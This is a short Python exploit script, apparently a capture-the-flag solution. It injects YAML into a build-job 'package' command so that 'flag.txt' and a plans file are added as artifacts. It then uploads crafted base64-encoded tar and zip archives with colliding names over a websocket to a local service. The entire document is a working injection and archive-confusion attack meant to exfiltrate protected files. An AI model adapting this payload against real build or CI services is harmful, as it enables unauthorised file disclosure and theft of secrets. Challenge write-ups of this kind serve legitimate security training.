#!/usr/bin/env python

from urllib.parse import quote
import base64
from websocket import create_connection # pip install websocket-client

inject = """foo"
      artifacts:
        - "bunker-expansion-plan.txt"
        - "flag.txt"
unused:
  unused:
    unused:
      unused:
        - \""""

template = open("dist/project/build.job").read()

with open("step_one.tar", "rb") as f:
    two = base64.b64encode(f.read()).decode()

with open("step_two.zip", "rb") as f:
    three = base64.b64encode(f.read()).decode()

exploit = [
    f"job package {quote(inject)}",
    f"upload foo.tar.tar {two}",
    f"upload foo.tar.zip {three}",
    f"list foo.tar",
]

ws = create_connection("ws://localhost:5555/ws/")

for x in exploit:
    ws.send(x)
    print(ws.recv())